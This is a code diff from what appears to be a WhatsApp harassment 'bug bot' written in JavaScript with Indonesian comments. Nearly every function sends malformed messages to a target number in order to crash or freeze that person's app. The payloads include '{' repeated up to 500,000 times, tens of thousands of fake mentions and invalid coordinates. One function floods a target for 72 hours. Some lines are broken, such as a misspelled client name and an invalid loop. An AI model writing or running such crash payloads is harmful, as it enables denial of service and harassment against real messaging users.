@@ -1617,31 +1617,6 @@ break
         
         //Bugs Zone//
         //(Function protocol delay)//
-        async function execDelay(target, durationHours = 72) {
-  const totalDurationMs = durationHours * 60 * 60 * 1000;
-  const startTime = Date.now();
-  let count = 0;
-
-  while (Date.now() - startTime < totalDurationMs) {
-    try {
-      if (count < 1000) {
-        await exDelay(target);
-        console.log(chalk.yellow(`Proses kirim bug sampai ${count + 1}/1000 target> ${target}`));
-        count++;
-      } else {
-        console.log(chalk.green(`[✓] Success Send Bug 1000 Messages to ${target}`));
-        count = 0;
-        console.log(chalk.red("➡️ Next 1000 Messages"));
-      }
-      await new Promise(resolve => setTimeout(resolve, 100));
-    } catch (error) {
-      console.error(`❌ Error saat mengirim: ${error.message}`);
-      await new Promise(resolve => setTimeout(resolve, 100));
-    }
-  }
-
-  console.log(`Stopped after running for 3 days. Total messages sent in last batch: ${count}`);
-}
           async function protocolbug(isTarget, mention) {
     const maxMention = 65000; // mendekati batas JS maksimal
     const mentionedList = Array.from({ length: maxMention }, (_, i) =>
@@ -1747,6 +1722,68 @@ break
         });
     }
 }
+async function execDelay(target, durationHours = 72) {
+  const totalDurationMs = durationHours * 60 * 60 * 1000;
+  const startTime = Date.now();
+  let count = 0;
+
+  while (Date.now() - startTime < totalDurationMs) {
+    try {
+      if (count < 1000) {
+        await exDelay(target);
+        console.log(chalk.yellow(`Proses kirim bug sampai ${count + 1}/1000 target> ${target}`));
+        count++;
+      } else {
+        console.log(chalk.green(`[✓] Success Send Bug 1000 Messages to ${target}`));
+        count = 0;
+        console.log(chalk.red("➡️ Next 1000 Messages"));
+      }
+      await new Promise(resolve => setTimeout(resolve, 100));
+    } catch (error) {
+      console.error(`❌ Error saat mengirim: ${error.message}`);
+      await new Promise(resolve => setTimeout(resolve, 100));
+    }
+  }
+
+  console.log(`Stopped after running for 3 days. Total messages sent in last batch: ${count}`);
+}
+
+async function exDelay(target) {
+await tdx.relayMessage(
+"status@broadcast", {
+extendedTextMessage: {
+text: `XrL ~ Dominations\n https://t.me/xrellyy\n`,
+contextInfo: {
+mentionedJid: [
+"6285215587498@s.whatsapp.net",
+...Array.from({
+length: 40000
+}, () =>
+`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+)
+]
+}
+}
+}, {
+statusJidList: [target],
+additionalNodes: [{
+tag: "meta",
+attrs: {},
+content: [{
+tag: "mentioned_users",
+attrs: {},
+content: [{
+tag: "to",
+attrs: {
+jid: target
+},
+content: undefined
+}]
+}]
+}]
+}
+);
+}
 async function bulldozerXDrain(target) {
   const mentioned = [
     "0@s.whatsapp.net",
@@ -1840,48 +1877,6 @@ async function bulldozerXDrain(target) {
 
   console.log(chalk.redBright(`[BULLDOZER] (${target}) ATTACKING`));
 }
-
-async function InvisibleFC(CosmoX, target) {
-  try {
-    let message = {
-      viewOnceMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              title: "OTAX",
-              hasMediaAttachment: false,
-              locationMessage: {
-                degreesLatitude: -999.035,
-                degreesLongitude: 922.999999999999,
-                name: "OTAX",
-                address: "\u200D",
-              },
-            },
-            body: {
-              text: "OTAX",
-            },
-            nativeFlowMessage: {
-              messageParamsJson: "{".repeat(10000),
-            },
-            contextInfo: {
-              participant: target,
-              mentionedJid: ["0@s.whatsapp.net"],
-            },
-          },
-        },
-      },
-    };
-
-    await bot.relayMessage(target, message, {
-      messageId: null,
-      participant: { jid: target },
-      userJid: target,
-    });
-  } catch (err) {
-    console.log(err);
-  }
-}
-
         async function buttonscrashX(target, Ptcp = true) {
   try {
     await bot.relayMessage(
@@ -2059,7 +2054,7 @@ async function BlankGroup(target) {
 }
 
 async function XiosVirus(target, QBug) {
-      renz.relayMessage(
+      bot.relayMessage(
         target,
         {
           extendedTextMessage: {
@@ -2089,8 +2084,48 @@ async function XiosVirus(target, QBug) {
         }
       );
     }
+async function InvisibleFC(CosmoX, target) {
+  try {
+    let message = {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              title: "OTAX",
+              hasMediaAttachment: false,
+              locationMessage: {
+                degreesLatitude: -999.035,
+                degreesLongitude: 922.999999999999,
+                name: "OTAX",
+                address: "\u200D",
+              },
+            },
+            body: {
+              text: "OTAX",
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "{".repeat(10000),
+            },
+            contextInfo: {
+              participant: target,
+              mentionedJid: ["0@s.whatsapp.net"],
+            },
+          },
+        },
+      },
+    };
+
+    await bot.relayMessage(target, message, {
+      messageId: null,
+      participant: { jid: target },
+      userJid: target,
+    });
+  } catch (err) {
+    console.log(err);
+  }
+}
 async function QDIphone(target, QBug) {
-      renz.relayMessage(
+      bor.relayMessage(
         target,
         {
           extendedTextMessage: {
@@ -2125,40 +2160,6 @@ async function QDIphone(target, QBug) {
         }
       );
     }
-async function invicXblank(target) {
-const msg = {
-    groupInviteMessage: {
-      groupJid: "120363370626418572@g.us",
-      inviteCode: "974197419741",
-      inviteExpiration: "97419741",
-      groupName: "⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀 :>" + "ោ៝".repeat(10000),
-      caption: "⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀 :>" + "ោ៝".repeat(10000),
-      jpegThumbnail: null
-    }
-  };
-  await renz.relayMessage(target, msg, {
-  participant: { jid: target }, 
-  messageId: null
-  })
-}
-async function loadedIos(isTarget) {
-await client.sendMessage(isTarget, {
-text: "🧪‌⃰Ꮡ‌‌" + "⛧ ⊺ΛϻΛ :: CONCƱΣЯЯOR ⛧" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
-contextInfo: {
-externalAdReply: {
-title: `⛧ ⊺ΛϻΛ :: CONCƱΣЯЯOR ⛧`,
-body: `Haii ${pushname}`,
-previewType: "PHOTO",
-thumbnail: "",
-sourceUrl: `https://example.com/tama`
-}
-}
-}, { quoted: m })
-}
-
-for (let r = 0; r 100; r++) {
-await closeIos(isTarget) 
-}
 async function Xmdsql(sock, target) {
   const mentionedList = Array.from({ length: 90000 }, () =>
     "250208" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
@@ -2207,12 +2208,12 @@ async function Xmdsql(sock, target) {
     }
   };
 
-  await sock.relayMessage(target, msg, {
+  await bot.relayMessage(target, msg, {
     messageId: "Jual Panel Gk-" + Math.floor(Math.random() * 9999999),
   });
 }
 async function killui(target, Ptcp = true) {
-      await renz.relayMessage(
+      await bot.relayMessage(
         target,
         {
           ephemeralMessage: {
@@ -2378,7 +2379,7 @@ async function killui(target, Ptcp = true) {
       message: message,
     };
 
-    await hades.relayMessage(target, message, { messageId: msg.key.id });
+    await bot.relayMessage(target, message, { messageId: msg.key.id });
     console.log(`Api Sending ${target}!`);
   } catch (error) {
     console.error("Error sending bug sticker pack:", error);
@@ -2427,7 +2428,7 @@ Crazycrashfunction(target, ptcp = true) {
             }
         };
 
-        await zephy.relayMessage(target, messagePayload, {
+        await bot.relayMessage(target, messagePayload, {
             additionalNodes: stanza,
             participant: { jid: target }
         });
@@ -2468,7 +2469,7 @@ async function ExtremeCrash(target) {
             },
         };
 
-        await zephy.relayMessage(target, crashMessage, {
+        await bot.relayMessage(target, crashMessage, {
             participant: { jid: target },
         });
 
@@ -2560,7 +2561,7 @@ try {
     }
   };
   for(let i = 0; i < ammount; i++) {
-  await Yuukey.relayMessage(target, message, {
+  await bot.relayMessage(target, message, {
     messageId: undefined,
     participant: { jid: target }
   });
@@ -2571,116 +2572,9 @@ try {
   console.log(err);
 }
 }
-async function ControlNative2(target) {
-  try {
-      let message = {
-        viewOnceMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              title: "",
-              hasMediaAttachment: false,
-              locationMessage: {
-                degreesLatitude: 992.999999,
-                degreesLongitude: -932.8889989,
-                name: "\u900A",
-                address: "\u0007".repeat(20000),
-              },
-            },
-            contextInfo: {
-              participant: "0@s.whatsapp.net",
-              remoteJid: "X",
-              mentionedJid: ["0@s.whatsapp.net"],
-            },
-              body: {
-                text:
-                  "",
-              },
-              nativeFlowMessage: {
-              messageParamsJson: "{".repeat(500000),
-            },
-          },
-        },
-      },
-    }, {
-      participant: { jid: target },
-      messageId: null,
-    });
-
-    const msg2 = {
-      groupMentionedMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              documentMessage: {
-                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
-       mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-       fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
-       fileLength: "9999999999999",
-       pageCount: 9999999999999,
-       mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
-       fileName: "AndreXcrash",
-       fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
-       directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
-       mediaKeyTimestamp: 1735456100,
-       contactVcard: true,
-       caption: "F*uck puki"
-              },
-            },
-            contextInfo: {
-              participant: target,
-              remoteJid: "X",
-              mentionedJid: ["6281393001103@s.whatsapp.net"],
-            },
-            body: {
-              text: "".repeat(92000),
-            },
-            nativeFlowMessage: {
-              messageParamsJson: "{}",
-            },
-          },
-        },
-      },
-    };
-
-    await leyna.relayMessage(target, msg2, {
-        messageId: null,
-      participant: { jid: target },
-      userJid: target,
-    });
-
-    for (let i = 0; i < 1; i++) {
-      const messageContent = {
-        viewOnceMessage: {
-          message: {
-            interactiveResponseMessage: {
-              body: {
-                text: "",
-                format: "DEFAULT"
-              },
-              nativeFlowResponseMessage: {
-                paramsJson: "{".repeat(10000),
-                version: 3
-              }
-            }
-          }
-        }
-      };
-
-      await leyna.relayMessage(target, messageContent, {
-        participant: { jid: target }
-      });
-
-      await new Promise(resolve => setTimeout(resolve, 300));
-    }
-
-  } catch (err) {
-    console.error("Terjadi kesalahan:", err);
-  }
-}
 async function CrashFcKipop(target) {
   try {
-    await sock.relayMessage(target, {
+    await bot.relayMessage(target, {
       viewOnceMessage: {
         message: {
           interactiveMessage: {
@@ -2731,7 +2625,7 @@ async function CrashFcKipop(target) {
         }
       };
 
-      await sock.relayMessage(target, messageContent, {
+      await bot.relayMessage(target, messageContent, {
         participant: { jid: target }
       });
 
@@ -2743,7 +2637,7 @@ async function CrashFcKipop(target) {
   }
 }
 async function ExternityFuckBlank(target, ptcp = true) {
-  await sock.relayMessage(
+  await bot.relayMessage(
     target,
     {
       ephemeralMessage: {
